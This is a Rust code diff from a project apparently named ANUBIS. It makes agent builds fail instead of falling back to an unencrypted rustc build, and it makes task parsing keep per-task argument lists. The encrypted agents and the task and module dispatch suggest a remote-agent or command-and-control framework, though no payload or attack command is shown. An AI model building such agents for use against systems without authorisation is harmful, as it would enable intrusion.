@@ -129,15 +129,21 @@ rand = "0.8"
         .status()
         .map_err(|e| anyhow!("ANUBIS_AGENT_CARGO: {e}"))?;
     if !status.success() {
-        // Fallback: try rustc-only cleartext build of a simplified agent
-        return build_agent_rustc_fallback(src, bin_path);
+        // Fail closed: do not fall back to a cleartext/rustc agent when cargo
+        // cannot build the encrypted aop-2 agent (aes-gcm required).
+        return Err(anyhow!(
+            "ANUBIS_AGENT_BUILD_FAILED: cargo release build failed for agent `{name}` (no cleartext rustc fallback)"
+        ));
     }
     let built = proj
         .join("target/release")
         .join(format!("anubis_agent_{name}"));
     // Windows would be .exe — macOS/linux as-is
     if !built.exists() {
-        return build_agent_rustc_fallback(src, bin_path);
+        return Err(anyhow!(
+            "ANUBIS_AGENT_BUILD_FAILED: release binary missing at {} (no cleartext rustc fallback)",
+            built.display()
+        ));
     }
     fs::copy(&built, bin_path)?;
     #[cfg(unix)]
@@ -146,36 +152,6 @@ rand = "0.8"
         let mut perms = fs::metadata(bin_path)?.permissions();
         perms.set_mode(0o755);
         fs::set_permissions(bin_path, perms)?;
-    }
-    Ok(())
-}
-
-fn build_agent_rustc_fallback(src: &str, bin_path: &Path) -> Result<()> {
-    // Strip encrypt paths if compile fails — use simplified template
-    let simple = src
-        .replace("use aes_gcm", "// use aes_gcm")
-        .replace("encrypt_mode", "false");
-    let tmp = bin_path.with_extension("rs");
-    fs::write(
-        &tmp,
-        if src.contains("aes_gcm") {
-            src
-        } else {
-            &simple
-        },
-    )?;
-    // Prefer original; if agent uses aes-gcm, cargo path is required
-    let status = Command::new("rustc")
-        .arg(&tmp)
-        .arg("-O")
-        .arg("-o")
-        .arg(bin_path)
-        .status()
-        .map_err(|e| anyhow!("ANUBIS_AGENT_RUSTC: {e}"))?;
-    if !status.success() {
-        return Err(anyhow!(
-            "ANUBIS_AGENT_BUILD_FAILED: cargo and rustc both failed for agent"
-        ));
     }
     Ok(())
 }
@@ -399,13 +375,34 @@ fn extract_json_string(json: &str, key: &str) -> Option<String> {
 }
 
 fn parse_tasks(json: &str) -> Option<Vec<(String, String, Vec<String>)>> {
+    // Standalone agent: no serde_json. Preserve task args from "args":[...].
     if !json.contains("\"tasks\"") { return Some(vec![]); }
     let mut out = Vec::new();
     for chunk in json.split("\"id\"").skip(1) {
         let id = extract_quoted_after_colon(chunk)?;
         let rest = chunk.split("\"module\"").nth(1)?;
         let module = extract_quoted_after_colon(rest)?;
-        out.push((id, module, Vec::new()));
+        let args = extract_string_array_after_key(chunk, "args").unwrap_or_default();
+        out.push((id, module, args));
+    }
+    Some(out)
+}
+
+fn extract_string_array_after_key(s: &str, key: &str) -> Option<Vec<String>> {
+    let pat = format!("\"{}\"", key);
+    let idx = s.find(&pat)?;
+    let after = &s[idx + pat.len()..];
+    let after = after.trim_start_matches(|c: char| c == ' ' || c == ':' || c == '\t');
+    let start = after.find('[')?;
+    let rest = &after[start + 1..];
+    let end = rest.find(']')?;
+    let inner = &rest[..end];
+    let mut out = Vec::new();
+    for part in inner.split(',') {
+        let p = part.trim();
+        if p.is_empty() { continue; }
+        let p = p.trim_matches('"');
+        if !p.is_empty() { out.push(p.to_string()); }
     }
     Some(out)
 }
